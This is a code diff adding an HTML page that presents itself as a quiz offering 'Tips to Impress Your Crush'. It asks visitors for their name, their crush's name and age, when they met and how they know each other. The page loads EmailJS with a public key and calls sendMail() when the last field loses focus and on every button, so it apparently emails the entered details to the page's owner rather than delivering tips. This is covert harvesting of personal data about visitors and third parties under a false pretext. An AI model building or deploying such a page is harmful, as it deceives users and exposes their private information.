@@ -1,0 +1,48 @@
+
+   <link rel="stylesheet" href="style.css">
+
+    <div class="row">
+
+        <input id="input-1" type="text" placeholder="Enter Your Good Name Here" required autofocus />
+        <label for="input-1">
+            <span class="label-text">Your Name</span>
+            <span class="nav-dot"></span>
+            <div class="signup-button-trigger">Let's Start</div>
+        </label>
+        <input id="input-2" type="text" placeholder="Enter Your Lovely Crush's Name Here" required />
+        <label for="input-2">
+            <span class="label-text">Crush Name</span>
+        <span class="nav-dot"></span>
+        </label>
+        <input id="input-3" type="text" placeholder="Enter The Year when You Met or Know Your Crush?" required />
+        <label for="input-3">
+            <span class="label-text">When were you met first time?
+            </span>
+            <span class="nav-dot"></span>
+        </label>
+        <input id="input-4" type="text" placeholder="Tell Us Your Crush's Age As We Can Check What thing can Impress Him/Her" required />
+        <label for="input-4">
+            <span class="label-text">How old he/she is ?</span>
+            <span class="nav-dot"></span>
+        </label>
+        <input id="input-5" type="text" onblur="sendMail()" placeholder="From School / Uni / Online" required />
+        <label for="input-5">
+            <span class="label-text">How Do You Know Her/Him ?</span>
+            <span class="nav-dot"></span>
+        </label>
+        
+        <button onclick="sendMail()" style="z-index: 10;">Get A Quick Guide..!</button>
+        <p class="tip">Press Tab</p>
+        <div class="signup-button" onclick="sendMail()">Tips to Impress Your Crush</div>
+        <script src="index.js"></script>
+        <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+      emailjs.init({
+        publicKey: "oPRQ9EM0FZymd7M5C",
+      });
+    })();
+    </script>
+ 
